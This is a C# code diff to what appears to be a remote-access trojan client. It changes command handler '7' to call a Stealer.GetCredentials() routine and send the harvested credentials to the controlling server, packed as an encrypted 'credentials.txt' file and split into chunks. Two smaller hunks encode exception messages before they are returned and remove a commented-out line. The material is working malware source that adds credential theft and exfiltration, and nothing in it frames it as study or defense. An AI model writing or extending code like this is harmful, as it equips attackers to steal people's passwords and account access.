@@ -107,9 +107,16 @@ namespace Client_side
                     }
                 case "7":
                     {
-                        string result = ExecuteCommand(commandParts[1]);
-                        byte[] encryptedResult = encryptor.Encrypt(result);
-                        NetworkLayer.SendResult(encryptedResult);
+                        List<String> credentialsChunks = Stealer.GetCredentials();
+                        string fileID = Guid.NewGuid().ToString();
+                        string fileLength = credentialsChunks.Count.ToString();
+                        string fileName = "credentials.txt";
+
+                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
+                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
+                        NetworkLayer.SendResult(encryptedHeader);
+
+                        SendChunks(credentialsChunks, encryptor, fileID);
                         break;
                     }
                 case "8":
@@ -189,7 +196,7 @@ namespace Client_side
             }
             catch (Exception e)
             {
-                return new List<string> { e.Message };
+                return new List<string> { Encryptor.ConvertStr(e.Message) };
             }
         }
 
@@ -417,7 +424,6 @@ namespace Client_side
                 catch (Exception ex)
                 {
                     procList += ex.ToString();
-                    //continue;
                 }
             }
             
